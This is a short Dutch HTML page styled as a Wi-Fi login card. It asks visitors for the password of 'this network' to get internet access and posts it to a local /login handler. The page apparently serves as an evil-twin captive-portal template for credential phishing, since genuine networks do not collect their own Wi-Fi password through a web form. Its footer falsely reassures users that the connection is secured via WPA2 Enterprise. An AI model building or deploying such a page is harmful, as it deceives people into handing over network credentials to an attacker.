<!DOCTYPE html>
<html lang="nl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Authenticatie</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #e9ecef; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-card { background: white; padding: 2rem; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 100%; max-width: 350px; text-align: center; }
        .icon { font-size: 50px; color: #007bff; margin-bottom: 1rem; }
        h2 { margin: 0 0 0.5rem 0; color: #333; font-size: 1.5rem; }
        p { color: #666; font-size: 0.9rem; margin-bottom: 1.5rem; }
        input[type="password"] { width: 100%; padding: 12px; margin-bottom: 1rem; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 1rem; }
        button { width: 100%; padding: 12px; border: none; border-radius: 6px; background-color: #007bff; color: white; font-size: 1rem; font-weight: bold; cursor: pointer; transition: background 0.3s; }
        button:hover { background-color: #0056b3; }
        .footer-text { margin-top: 1.5rem; font-size: 0.75rem; color: #999; }
    </style>
</head>
<body>
    <div class="login-card">
        <div class="icon">📶</div>
        <h2>WiFi Verbinding</h2>
        <p>Voer het wachtwoord van dit netwerk in om toegang te krijgen tot het internet.</p>
        <form action="/login" method="POST">
            <input type="password" name="password" placeholder="Wachtwoord" required>
            <button type="submit">Verbinden</button>
        </form>
        <div class="footer-text">
            Beveiligde verbinding via WPA2 Enterprise
        </div>
    </div>
</body>
</html>
